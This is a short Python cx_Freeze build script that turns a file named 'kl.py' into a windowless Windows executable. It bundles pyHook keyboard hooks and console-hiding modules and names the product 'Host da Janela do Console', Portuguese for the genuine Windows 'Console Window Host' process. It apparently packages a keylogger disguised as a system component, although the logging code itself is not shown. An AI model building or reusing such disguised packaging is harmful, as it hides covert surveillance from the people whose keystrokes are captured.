from cx_Freeze import setup, Executable

build_exe_options = {"packages": ["sys", "os", "win32console", "win32gui", "pythoncom", "pyHook", "mp3play", "Tkinter", "tkMessageBox"]}

base = "Win32GUI"

setup(  name = "Host da Janela do Console",
        version = "0.1",
        description = "Host da Janela do Console",
        options = {"build_exe": build_exe_options},
        executables = [Executable("kl.py", base=base)])